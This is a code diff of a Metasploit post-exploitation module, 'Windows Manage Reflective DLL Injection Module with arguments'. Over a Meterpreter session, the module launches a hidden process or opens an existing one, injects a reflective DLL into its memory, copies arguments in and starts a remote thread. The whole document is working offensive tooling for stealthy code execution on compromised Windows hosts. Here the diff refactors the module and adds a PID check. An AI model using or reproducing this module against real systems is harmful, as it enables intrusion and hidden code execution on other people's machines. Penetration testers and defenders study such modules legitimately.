@@ -6,8 +6,6 @@
 require 'msf/core/post/windows/reflective_dll_injection'
 
 class MetasploitModule < Msf::Post
-  Rank = NormalRanking
-
   include Msf::Post::File
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Process
@@ -15,21 +13,21 @@ class MetasploitModule < Msf::Post
 
   def initialize(info = {})
     super(update_info(info,
-                      'Name' => 'Windows Manage Reflective DLL Injection
-                      Module with arguments',
-                      'Description' => '
-                      This module will inject a specified reflective DLL
-                      into the memory of a process, new or existing,
-                      passing any arguments.
-                      ',
-                      'License' => MSF_LICENSE,
-                      'Author' => 'Ben Campbell,b4rtik',
-                      'Platform' => 'win',
-                      'SessionTypes' => ['meterpreter'],
-                      'References'   =>
-                        [
-                          [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ]
-                        ]))
+      'Name' => 'Windows Manage Reflective DLL Injection
+      Module with arguments',
+      'Description' => '
+      This module will inject a specified reflective DLL
+      into the memory of a process, new or existing,
+      passing any arguments.
+      ',
+      'License' => MSF_LICENSE,
+      'Author' => 'Ben Campbell,b4rtik',
+      'Platform' => 'win',
+      'SessionTypes' => ['meterpreter'],
+      'References'   =>
+      [
+        [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ]
+      ]))
     register_options(
       [
         OptPath.new('PATH', [true, 'Reflective DLL to inject into memory of a process.']),
@@ -44,7 +42,6 @@ class MetasploitModule < Msf::Post
   def run
     dll_path = gen_dll_path
     if File.file?(dll_path)
-      client.response_timeout=20
       run_dll(dll_path)
     else
       print_bad("Dll not found #{dll_path}")
@@ -57,33 +54,47 @@ class MetasploitModule < Msf::Post
   end
 
   def sanitize_process_name(process_name)
-    out_process_name = if process_name.split(//).last(4).join.eql? '.exe'
-                         process_name
-                       else
-                         process_name + '.exe'
-                       end
-    out_process_name
+    if process_name.split(//).last(4).join.eql? '.exe'
+      process_name
+    else
+      process_name + '.exe'
+    end
   end
 
   def pid_exists(pid)
-    return true
+    mypid = client.sys.process.getpid.to_i
+
+    if pid == mypid
+      print_bad("Invalid PID")
+	  return false
+	end
+	
+	host_processes = client.sys.process.get_processes
+    if host_processes.length < 1
+      print_bad("No running processes found on the target host.")
+      return false
+    end
+
+    theprocess = host_processes.find {|x| x["pid"] == pid}
+
+    if ( theprocess.nil? )
+      return false
+    else
+      return true
+    end
+
   end
 
   def launch_process
     process_name = sanitize_process_name(datastore['PROCESS'])
-    print_status("Launching #{process_name} to inject Dll...")
-    channelized = if datastore['WAIT'] != 0
-                    true
-                  else
-                    false
-                  end
+    print_status("Launching #{process_name} ...")
+    channelized = datastore['WAIT'] != 0
 
     process = client.sys.process.execute(process_name, nil,
-                                                 'Channelized' => true,
-                                                 'Hidden' => true)
-    hprocess = client.sys.process.open(process.pid,
-                                      PROCESS_ALL_ACCESS)
-    print_good("Process #{hprocess.pid} launched.")
+      'Channelized' => channelized,'Hidden' => true)
+
+    hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
+    print_good("Process #{hprocess.pid} created.")
     [process, hprocess]
   end
 
@@ -94,31 +105,40 @@ class MetasploitModule < Msf::Post
     [exploit_mem, offset]
   end
 
-  def hook_process
-    print_status('Warning: output unavailable')
-    print_status("Hooking #{datastore['PID']} to be injected Dll...")
-    hprocess = client.sys.process.open(datastore['PID'],
-                                      PROCESS_ALL_ACCESS)
-    print_good("Process #{hprocess.pid} hooked.")
-    [nil, hprocess]
+  def open_process
+    pid = datastore['PID'].to_i
+    if not pid_exists(pid)
+      print_bad("Pid not found")
+      [nil, nil]
+	else
+      print_status('Warning: output unavailable')
+      print_status("Opening handle to process #{datastore['PID']} ...")
+      hprocess = client.sys.process.open(datastore['PID'], PROCESS_ALL_ACCESS)
+      print_good("Handle opened")
+      [nil, hprocess]
+    end
   end
 
   def run_dll(dll_path)
     print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
-    process, hprocess = if datastore['PID'] <= 0
-                          launch_process
-                        else
-                          hook_process
-                        end
-    exploit_mem, offset = inject_dll(hprocess,dll_path)
+    if datastore['PID'] <= 0
+      process, hprocess = launch_process
+    else
+      process, hprocess = open_process
+    end
+    
+	if hprocess.nil?
+      print_bad("Execution finished")
+      return
+    end
+	
+	exploit_mem, offset = inject_dll(hprocess,dll_path)
 
-    params_size = if datastore['ARGUMENTS'].nil?
-                    0
-                  else
-                    datastore['ARGUMENTS'].length
-                  end
-
-    arg_mem = copy_args(hprocess)
+    if datastore['ARGUMENTS'].nil?
+      arg_mem = nil
+    else
+      arg_mem = copy_args(hprocess)
+    end
 
     print_status('Executing...')
     hprocess.thread.create(exploit_mem + offset, arg_mem)
@@ -136,19 +156,10 @@ class MetasploitModule < Msf::Post
   end
 
   def copy_args(process)
-    argssize = if datastore['ARGUMENTS'].nil?
-                 1
-               else
-                 datastore['ARGUMENTS'].size + 1
-               end
-    payload_size = argssize + 1
-    arg_mem = process.memory.allocate(payload_size, PAGE_READWRITE)
+    argssize = datastore['ARGUMENTS'].size + 1
+    arg_mem = process.memory.allocate(argssize, PAGE_READWRITE)
 
-    params = if datastore['ARGUMENTS'].nil?
-               ''
-             else
-               datastore['ARGUMENTS']
-             end
+    params = datastore['ARGUMENTS']
     params += "\x00"
 
     process.memory.write(arg_mem, params)
@@ -164,7 +175,7 @@ class MetasploitModule < Msf::Post
         break if output.length == 0
       end
     rescue ::Exception => e
-      #print_status("Error running assemply: #{e.class} #{e}")
+      
     end
 
     print_status('End output.')
